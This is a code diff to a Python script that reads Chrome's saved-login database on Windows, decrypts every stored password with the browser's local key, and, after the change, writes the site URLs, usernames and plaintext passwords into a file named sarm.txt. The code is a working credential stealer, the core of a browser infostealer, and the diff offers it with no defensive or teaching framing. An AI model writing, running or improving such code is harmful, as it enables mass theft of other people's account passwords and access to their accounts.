@@ -4,7 +4,7 @@ import win32crypt
 from Crypto.Cipher import AES
 import json
 import base64
-# test with marsellino stay safe :D
+
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
                                     "AppData", "Local", "Google", "Chrome",
@@ -29,18 +29,22 @@ def get_chrome_passwords():
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Login Data")
     
-    with sqlite3.connect(db_path) as db:
-        cursor = db.cursor()
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        for origin_url, username, encrypted_password in cursor.fetchall():
-            if encrypted_password:
-                decrypted_password = decrypt_password(encrypted_password, key)
-                if username and decrypted_password:
-                    print(f"Origin URL: {origin_url}")
-                    print(f"Username: {username}")
-                    print(f"Password: {decrypted_password}")
-                    print("=" * 50)
-        cursor.close()
+    output_file = os.path.join(os.getcwd(), "sarm.txt")  # Save in the same directory
+    with open(output_file, "w", encoding="utf-8") as file:
+        with sqlite3.connect(db_path) as db:
+            cursor = db.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            for origin_url, username, encrypted_password in cursor.fetchall():
+                if encrypted_password:
+                    decrypted_password = decrypt_password(encrypted_password, key)
+                    if username and decrypted_password:
+                        file.write(f"Origin URL: {origin_url}\n")
+                        file.write(f"Username: {username}\n")
+                        file.write(f"Password: {decrypted_password}\n")
+                        file.write("=" * 50 + "\n")
+            cursor.close()
+    
+    print(f"Passwords saved in {output_file}")
 
 if __name__ == "__main__":
     get_chrome_passwords()
